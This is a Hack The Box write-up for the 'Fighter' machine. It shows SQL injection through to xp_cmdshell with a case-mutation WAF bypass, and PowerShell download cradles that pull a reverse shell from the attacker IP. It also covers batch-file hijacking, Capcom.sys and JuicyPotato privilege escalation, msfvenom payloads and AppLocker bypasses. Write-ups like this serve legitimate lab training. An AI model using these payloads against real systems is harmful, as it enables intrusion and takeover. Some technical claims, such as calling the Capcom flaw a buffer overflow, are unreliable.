---
icon: user-ninja
cover: ../../../../.gitbook/assets/Screenshot 2026-03-04 124827.png
coverY: -4.375521656750891
---

# HTB-FIGHTER

### Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

#### Port Scanning with Rustscan

Starting with a fast TCP port scan to identify what services are exposed:

```
┌──(sn0x㉿sn0x)-[~/HTB/Fighter]
└─$ rustscan -a 10.10.10.72 blah blah
```

The scan reveals only HTTP on port 80 is open. Rustscan identifies IIS 8.5, which strongly suggests Windows Server 2012 R2. The service detection also picks up the ASP.NET header, indicating this is a .NET application.

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5
|_http-title: StreetFighter Club
```

The IIS version is a good indicator for OS identification, but more importantly, it tells us we're dealing with ASP.NET—which typically means we're looking at either .aspx or .asp files.

#### Website Reconnaissance

<figure><img src="../../../../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>

Visiting the main page shows a Street Fighter fan club website. There's an interesting hint in the top post about a "members" site that's mentioned but not explicitly linked. This is a common pattern in CTF boxes—when they tell you to find something but don't give you the path, it usually means subdomain fuzzing.

#### Subdomain Discovery with Wfuzz

Let me search for subdomains that exist under `streetfighterclub.htb`:

```
┌──(sn0x㉿sn0x)-[~/HTB/Fighter]
└─$ wfuzz -u http://streetfighterclub.htb -H "Host: FUZZ.streetfighterclub.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hh 6911
```

The `--hh 6911` filter removes the default response size (which we saw was 6911 characters), so we're looking for anything different. This reveals the `members` subdomain returning a 403 Forbidden response—exactly what that post was hinting at.

```
000000134:   403        29 L     92 W     1233 Ch     "members"
```

#### Directory Brute Force on members Subdomain

The members subdomain returns 403 directly, but there's probably more to the path. Let me enumerate directories under it:

```
┌──(sn0x㉿sn0x)-[~/HTB/Fighter]
└─$ feroxbuster -u http://members.streetfighterclub.htb -x aspx,asp,html -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
```

This reveals an `/old/` directory containing login pages:

```
301      GET        2l       10w      164c http://members.streetfighterclub.htb/old => http://members.streetfighterclub.htb/old/
200      GET       58l      129w     1821c http://members.streetfighterclub.htb/old/login.asp
302      GET        2l       10w      130c http://members.streetfighterclub.htb/old/welcome.asp => Login.asp
302      GET        2l       10w      130c http://members.streetfighterclub.htb/old/verify.asp => login.asp
```

***

### SQL Injection Discovery and Exploitation

#### Finding the Vulnerability

Accessing `/old/login.asp` shows a basic login form with username, password fields, and a `logintype` parameter. The HTML source reveals that `logintype` has specific values: 1 for administrator, 2 for user. This is suspicious—why would this be a numeric value sent to the backend?

When I send a POST request with standard credentials to `/old/verify.asp`, the response contains set-cookie headers with base64-encoded values. Interesting, but not immediately useful.

However, when I try to be clever and send non-numeric data in the `logintype` parameter, the server crashes with a 500 error. That's the first sign of SQL injection—the backend is probably inserting this value directly into a SQL query without proper type checking.

#### Union-Based SQL Injection

Let me test with SQL syntax: `logintype=1-- -`. This returns a 302 redirect instead of a 500 error, which means the SQL syntax is valid. Perfect—confirmed SQL injection.

To perform a UNION injection, I need to determine the number of columns in the original query. I'll start with one column and work up:

```
logintype=1 UNION SELECT 1-- -
logintype=1 UNION SELECT 1,2-- -
logintype=1 UNION SELECT 1,2,3-- -
... and so on
```

With six columns, I get a 302 response, and the fifth column's value appears in the `Email` cookie. This is my data extraction point. The query structure is something like:

```sql
SELECT username, password, level, email, ?, ? FROM users WHERE username=? AND logintype=?
```

#### Data Extraction

Testing with `SELECT @@version` in the fifth column reveals:

```
Microsoft SQL Server 2014 - 12.0.2269.0 (X64) 
    Jun 10 2015 03:35:45 
    Copyright (c) Microsoft Corporation
    Express Edition (64-bit) on Windows NT 6.3
```

This confirms both the SQL Server version and the OS version. I can extract other information, but more importantly, ASP + MSSQL supports stacked queries, which means I can append new queries after a semicolon.

#### Enabling Command Execution

By default, `xp_cmdshell` is disabled in SQL Server. However, as `dbo` (database owner), I can enable it with three commands:

```sql
EXEC sp_configure 'show advanced options', 1;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Sending these through the injection point should enable command execution. The challenge now is actually getting output from these commands when we're working blind.

***

### Blind Command Execution and WAF Bypass

#### Testing Basic Command Execution

My first attempt to run `xp_cmdshell 'ping 10.10.14.6'` returns a 500 error. This suggests there's input filtering in place—likely a Web Application Firewall watching for known-bad commands like `xp_cmdshell`.

The key insight here is that WAFs typically match against specific case patterns. When I change the casing to `xp_cmDshElL`, the request goes through! The server hangs for about five seconds (the ping timeout), and my tcpdump listener confirms ICMP echo requests from 10.10.10.72. This is command execution, but blind—we won't see output.

```
┌──(sn0x㉿sn0x)-[~/HTB/Fighter]
└─$ sudo tcpdump -ni tun0 icmp
```

#### Finding PowerShell

With basic command execution confirmed, the next step is to get a reverse shell. Windows cmd.exe is quite limited, but PowerShell is much more capable. However, I need to test which PowerShell variant is available.

Testing the 64-bit version at `C:\Windows\system32\windowspowershell\v1.0\powershell.exe` doesn't work—likely because AppLocker is blocking the 64-bit process. But the 32-bit version at `C:\Windows\SysWow64\WindowsPowerShell\v1.0\powershell.exe` succeeds! This is a common real-world scenario where sysadmins forget about legacy 32-bit binaries when setting security policies.

#### Reverse Shell via PowerShell Download Cradle

The cleanest approach for blind injection is to make PowerShell download and execute a script from my web server:

```
C:\windows\syswow64\windowspowershell\v1.0\powershell.exe "iex(new-object net.webclient).downloadstring(\"http://10.10.14.6/rev.ps1\")"
```

I'll use the `Invoke-PowerShellTcp` script from the Nishang repository, which is a reliable reverse shell. After uploading it and crafting the proper SQL injection payload with URL encoding and escaping, the request comes through:

```
┌──(sn0x㉿sn0x)-[~/HTB/Fighter]
└─$ rlwrap -cAr ncat -lvnp 443
Windows PowerShell running as user sqlserv on FIGHTER
```

I now have a shell as `sqlserv`, the MSSQL service account. Notice that `sqlserv` has `SeImpersonatePrivilege` enabled—this will be important for later privilege escalation vectors.

***

### Post-Exploitation Enumeration

#### System Information

The `systeminfo` command confirms Windows Server 2012 R2 with 159 hotfixes applied. That large number of patches suggests kernel vulnerabilities aren't the intended path.

#### User Accounts and Interesting Files

The box has three non-Guest users:

* `sqlserv` (current)
* `decoder`
* `Administrator`

In `C:\users\decoder`, there's a `clean.bat` file:

```batch
@echo off 
del /q /s c:\users\decoder\appdata\local\TEMP\*.tmp 
exit
```

This looks like it runs on a schedule. The presence of an `exit` statement is actually a problem if we want to hijack this script—anything we append won't execute.

#### AppLocker Analysis

The environment has AppLocker configured. We can't write `.bat`, `.exe`, or `.ps1` files directly to most directories. However, there's a nuance: we can write to certain locations, and we can sometimes work around extension restrictions.

***

### Privilege Escalation Path 1: Batch Script Hijacking

#### Modifying clean.bat

The `clean.bat` file has modify permissions (`Everyone:(M)`), which means we can append to it. But the `exit` statement prevents anything we add from running.

Here's the trick: using `cmd /c copy /y NUL clean.bat` actually truncates the file to zero bytes while preserving the append permission. This is a quirk of how Windows handles the `NUL` device:

```
┌──(sn0x㉿sn0x)-[~/HTB/Fighter]
└─$ powershell
PS C:\users\decoder> cmd /c copy /y NUL clean.bat
        1 file(s) copied.
PS C:\users\decoder> ls -la clean.bat
-a--- 0 bytes
```

Now the file is empty, and we can add our payload:

```
PS C:\users\decoder> cmd /c "echo powershell iex(new-object net.webclient).downloadstring('http://10.10.14.6/REV.PS1') >> clean.bat"
```

When the scheduled task runs (at the top of each minute), our command executes and downloads the reverse shell script. A few seconds later, we have a shell as `decoder`:

```
Windows PowerShell running as user decoder on FIGHTER
PS C:\Windows\system32> whoami
fighter\decoder
```

This is a lateral movement technique that exploits insecure file permissions on scheduled tasks.

***

### Privilege Escalation Path 2: Capcom.sys Driver Exploitation

#### Identifying the Vulnerable Driver

Now that we're `decoder`, let's enumerate what's available for privilege escalation. Running `driverquery /v` and filtering out standard Windows drivers reveals something interesting:

```
Module Name  Display Name           State      Path
Capcom       Capcom                 Running    \??\C:\Windows\Capcom.sys
```

Capcom is famous—this is the Street Fighter 5 DRM driver that had a critical vulnerability allowing arbitrary kernel code execution. The fact that it's here is no coincidence given the box theme.

#### Capcom.sys Vulnerability Background

The Capcom driver contained a buffer overflow vulnerability in its device control handling. By sending a specially crafted I/O request with insufficient bounds checking, an attacker can execute arbitrary code in kernel mode. Since any user can interact with loaded drivers, `decoder` (a low-privilege user) can exploit this to gain SYSTEM access.

#### PowerShell-Based Exploitation

Rather than uploading compiled executables (which AppLocker would block), I'll use a PowerShell exploitation module. The exploit exists as a collection of PowerShell scripts in this repository, but instead of uploading them individually (which would trigger AppLocker for `.ps1` files), I'll combine them into a single file:

```
┌──(sn0x㉿sn0x)-[~/HTB/Fighter]
└─$ find capcom-exploit -name "*.ps1" -exec cat {} \; -exec echo \; > capcom-combined
```

This merges all the functions into one monolithic file that we can download and import directly. Then:

```
PS C:\> iex(new-object net.webclient).downloadstring('http://10.10.14.6/capcom-combined')
PS C:\> Capcom-ElevatePID
[+] SYSTEM Token: 0xFFFFC0001B60777C
[+] Found PID: 5096
[+] Duplicating SYSTEM token!
PS C:\> whoami
nt authority\system
```

The `Capcom-ElevatePID` function duplicates the SYSTEM token from a running kernel process and injects it into our current process, instantly elevating us to SYSTEM.

***

### Root Flag Recovery

#### Finding the Flag Binary

On the Administrator's desktop, there are two suspicious files:

```
PS C:\users\administrator\desktop> ls
checkdll.dll
root.exe
```

Running `root.exe` without arguments shows it requires a password:

```
PS C:\users\administrator\desktop> .\root.exe
C:\users\administrator\desktop\root.exe <password>
```

This is a crackme-style challenge embedded in the privilege escalation path.

#### Reverse Engineering with Ghidra

Copying both files to the web root for easy download, I'll analyze them in Ghidra. The `root.exe` main function is straightforward:

```c
undefined4 __cdecl main(int argc, char **argv) {
  int res;
  
  if (argc < 2) {
    printf("%s <password>", argv[0]);
    exit(1);
  }
  res = check(argv[1]);
  if (res != 1) {
    printf("Sorry, check returned: %d\n", res);
    exit(2);
  }
  print_flag();
  return 0;
}
```

It calls `check()` which is exported from `checkdll.dll`. Looking at that DLL:

```c
int __cdecl check(int password) {
  uint i;
  
  i = 0;
  do {
    if ((*(byte *)(password + i) ^ 9) != (&obfuscated_password)[i]) {
      return 0;
    }
    i = i + 1;
  } while (i < 10);
  return 1;
}
```

The check loops over 10 bytes, XORing each byte of our input with 9 and comparing against a stored buffer. To recover the password, I'll extract the obfuscated buffer and reverse the XOR:

```python
obpass = b'\x46\x6d\x60\x66\x45\x68\x4f\x6c\x7d\x68'
password = ''.join([chr(x ^ 9) for x in obpass])
# Result: 'OdioLaFeta'
```

The `print_flag()` function uses similar obfuscation:

```c
int print_flag(void) {
  uint i;
  int byte;
  
  i = 0;
  do {
    byte = tolower((int)(char)(&obfuscated_flag)[i]);
    printf("%c", byte - 7);
    i = i + 1;
  } while (i < 0x20);
  return 1;
}
```

Extracting the obfuscated flag and subtracting 7 from each byte:

```python
obflag = b'\x4b\x3f\x37\x38\x4a\x38\x4c\x40\x49\x4b\x40\x48\x37\x39\x4d\x3f\x4d\x49\x3a\x37\x4b\x3f\x49\x4b\x3a\x49\x4c\x3a\x38\x3b\x4a\x38'
flag = ''.join([chr(x - 7) for x in obflag]).lower()
# Result: 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'
```

#### Retrieving the Flag

With the password discovered:

```
PS C:\users\administrator\desktop> .\root.exe OdioLaFeta
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

***

### Alternative Privilege Escalation Paths

While the Capcom driver exploitation is the most direct path, there are several other methods that work on this system, each demonstrating different bypass techniques.

#### AppLocker Bypass 1: MSBuild

MSBuild is a legitimate Microsoft build tool that's whitelisted by AppLocker. It can execute arbitrary C# code embedded in XML project files. Using `msfvenom` to generate shellcode and wrapping it in an MSBuild template:

```
┌──(sn0x㉿sn0x)-[~/HTB/Fighter]
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.6 LPORT=443 -f csharp -v shellcode
```

The generated shellcode is then embedded in an MSBuild XML file and executed:

```
PS C:\programdata> iwr http://10.10.14.6/shellcode.xml -outfile sc.xml
PS C:\programdata> C:\Windows\microsoft.net\framework\v4.0.30319\msbuild.exe sc.xml
```

This launches a Meterpreter session while bypassing AppLocker's executable restrictions.

#### AppLocker Bypass 2: Extensionless Executables

AppLocker blocks files with `.exe` extensions but doesn't necessarily block executables without that extension. If we download a Meterpreter payload and save it without an extension, we can still execute it:

```
PS C:\programdata> iwr 10.10.14.6/met.exe -outfile met
PS C:\programdata> Start-Process -Filepath C:\programdata\met -Wait -NoNewWindow
```

This works because Windows file execution is extension-agnostic at the binary level—AppLocker's blocking is based on the filename rules, not the actual file content.

#### AppLocker Bypass 3: color Directory

The `C:\Windows\System32\spool\drivers\color` directory is a known AppLocker whitelisted location that's world-writable. Any executable placed there can run without restriction:

```
PS C:\programdata> copy met C:\windows\system32\spool\drivers\color\met.exe
```

This is often used as a staging directory in real-world AppLocker bypasses.

#### Privilege Escalation via Metasploit's Capcom Module

While the PowerShell approach works, we can also use Metasploit's built-in Capcom exploit. However, it requires modifications because the check function looks for specific OS versions.

First, get a Meterpreter shell using any of the bypasses above. The Metasploit module has a built-in check that fails on Windows Server 2012 R2:

```ruby
def check
  if sysinfo['OS'] !~ /windows (7|8|10)/i
    return Exploit::CheckCode::Unknown
  end
```

Comment out this OS check in the module source code. Additionally, the exploit requires a 64-bit Meterpreter session. If you only have 32-bit, migrate to a 64-bit process:

```
meterpreter > migrate 3664
[*] Migrating from 3524 to 3664...
[*] Migration completed successfully.
```

Then the exploit will work:

```
msf6 exploit(windows/local/capcom_sys_exec) > run
[*] Launching msiexec to host the DLL...
[+] Process 420 launched.
[*] Reflectively injecting the DLL into 420...
[*] Meterpreter session 2 opened
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

#### Privilege Escalation via JuicyPotato

The `sqlserv` account has `SeImpersonatePrivilege`, which is typically available to service accounts like IIS or MSSQL. This enables a class of privilege escalation exploits known as the "Potato" family.

When this box was created, RottenPotato was state-of-the-art, but the creators disabled BITS (the COM service it relied on). This led to the development of JuicyPotato, which works with other DCOM services.

Download JuicyPotato and place it in the color directory:

```
PS C:\windows\system32\spool\drivers\color> wget 10.10.14.6/JuicyPotato.exe -outfile jp.exe
```

The default CLSID (BITS) doesn't work on Server 2012 R2, so we need to specify a different one. For Windows 2012, the WMI service CLSID works:

```
PS C:\windows\system32\spool\drivers\color> .\jp.exe -t * -p C:\windows\system32\spool\drivers\color\met.exe -l 9001 -c "{8BC3F05E-D86B-11D0-A075-00C04FB68820}"
Testing {8BC3F05E-D86B-11D0-A075-00C04FB68820} 9001
......
[+] authresult 0
{8BC3F05E-D86B-11D0-A075-00C04FB68820};NT AUTHORITY\SYSTEM
[+] CreateProcessWithTokenW OK
```

This creates a new process with the SYSTEM token, giving us immediate elevation.

***

### Attack Flow

```
Initial Reconnaissance
├─ Rustscan: Port 80 open (IIS 8.5)
├─ Subdomain fuzzing: Discover members.streetfighterclub.htb
└─ Directory enumeration: Find /old/login.asp

SQL Injection Exploitation
├─ Discover SQLi via logintype parameter
├─ UNION-based injection to extract data
├─ Enable xp_cmdshell via stacked queries
└─ Case-mutation WAF bypass (xp_cmDshElL)

Initial Command Execution (sqlserv)
├─ Find 32-bit PowerShell available (64-bit AppLocker blocked)
├─ Download reverse shell via iex cradle
└─ Establish shell as FIGHTER\sqlserv

Lateral Movement (sqlserv → decoder)
├─ Identify clean.bat in decoder's directory
├─ Truncate file with NUL copy trick
├─ Inject PowerShell reverse shell
└─ Execute via scheduled task → FIGHTER\decoder shell

Privilege Escalation (decoder → SYSTEM)
├─ Identify Capcom.sys kernel driver
├─ Download PowerShell exploitation module
├─ Capcom-ElevatePID duplicates SYSTEM token
└─ Achieve FIGHTER\SYSTEM shell

Root Flag Recovery
├─ Reverse engineer root.exe with Ghidra
├─ Extract obfuscated password via XOR
├─ Recover obfuscated flag via subtraction
└─ Flag: d801c1e9bd9a02f8fb30d8bd3be314c1
```

***

### Techniques&#x20;

| Technique                                | Classification       | Where Used                               | Why It Works                                                                                   |
| ---------------------------------------- | -------------------- | ---------------------------------------- | ---------------------------------------------------------------------------------------------- |
| Subdomain Fuzzing                        | Enumeration          | Initial website reconnaissance           | Uncovers hidden services not linked from main page                                             |
| Union-Based SQL Injection                | Exploitation         | verify.asp logintype parameter           | Backend directly concatenates numeric input into SQL query without type validation             |
| Stacked Query Execution                  | Exploitation         | MSSQL command execution                  | ASP + MSSQL supports multiple queries in single request when separated by semicolon            |
| Input Filtering Bypass via Case Mutation | Evasion              | xp\_cmdshell WAF bypass                  | WAF pattern matches case-sensitive strings; changing casing bypasses regex rules               |
| 32-bit Binary Preference                 | Evasion              | PowerShell AppLocker bypass              | AppLocker rules block 64-bit executables; 32-bit versions often overlooked                     |
| iex Download Cradle                      | Post-Exploitation    | PowerShell reverse shell                 | IEX (Invoke-Expression) evaluates downloaded scripts without touching disk                     |
| Scheduled Task Hijacking                 | Privilege Escalation | clean.bat modification                   | Scheduled tasks run with elevated privileges; modifiable scripts execute with those privileges |
| File Truncation via NUL                  | Evasion              | Remove exit from batch script            | Windows copy NUL preserves append permissions while clearing file content                      |
| Kernel Driver Exploitation               | Privilege Escalation | Capcom.sys SYSTEM elevation              | Driver vulnerable to buffer overflow; direct kernel access allows arbitrary code execution     |
| Token Duplication                        | Privilege Escalation | Capcom PowerShell exploitation           | Kernel code duplicates SYSTEM token and injects into our process context                       |
| MSBuild XML Execution                    | AppLocker Bypass     | Alternative meterpreter delivery         | MSBuild whitelisted by AppLocker; executes embedded C# shellcode                               |
| Extensionless Executable                 | AppLocker Bypass     | Alternative binary execution             | AppLocker blocks by extension; executable without .exe runs without restriction                |
| Whitelisted Directory                    | AppLocker Bypass     | spool\drivers\color staging              | Known directory in default AppLocker policies; world-writable                                  |
| DCOM Service Impersonation               | Privilege Escalation | JuicyPotato SeImpersonate escalation     | SeImpersonate privilege allows creation of new process with different token                    |
| Binary Reverse Engineering               | Post-Exploitation    | Ghidra analysis of root.exe/checkdll.dll | Extract obfuscation logic and recover hidden password and flag                                 |
| XOR Decryption                           | Cryptography         | Password recovery from checkdll.dll      | Simple byte-level XOR with constant key; trivial to reverse                                    |

***

<figure><img src="../../../../.gitbook/assets/complete (37).gif" alt=""><figcaption></figcaption></figure>
